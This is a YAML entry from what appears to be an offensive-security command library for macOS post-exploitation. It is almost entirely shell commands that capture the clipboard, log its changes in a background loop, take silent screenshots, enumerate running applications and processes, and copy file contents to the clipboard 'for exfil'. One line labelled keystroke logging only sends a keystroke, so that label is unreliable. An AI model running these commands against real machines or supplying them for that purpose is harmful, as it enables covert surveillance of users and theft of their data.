---
description: |
  Capture clipboard contents, monitor for changes, take screenshots, and enumerate running applications on macOS for post-exploitation intelligence gathering.
command: |
  # Read current clipboard contents:
  pbpaste

  # Monitor clipboard changes over time:
  while true; do pbpaste; echo "---"; sleep 2; done > /tmp/clipboard.log &

  # Capture screenshot silently:
  screencapture -x /tmp/screen.png

  # Capture screenshot of a specific display:
  screencapture -x -D 1 /tmp/screen_display1.png

  # List running applications (foreground):
  osascript -e 'tell application "System Events" to get name of every process whose background only is false'

  # List all running processes:
  ps aux

  # Keystroke logging via osascript (limited by TCC):
  # Note: requires Accessibility permissions, blocked by TCC on modern macOS
  osascript -e 'tell application "System Events" to keystroke "test"'

  # Copy file contents to clipboard for exfil:
  cat /etc/hosts | pbcopy
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - macOS
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation
  - https://ss64.com/mac/pbpaste.html
---
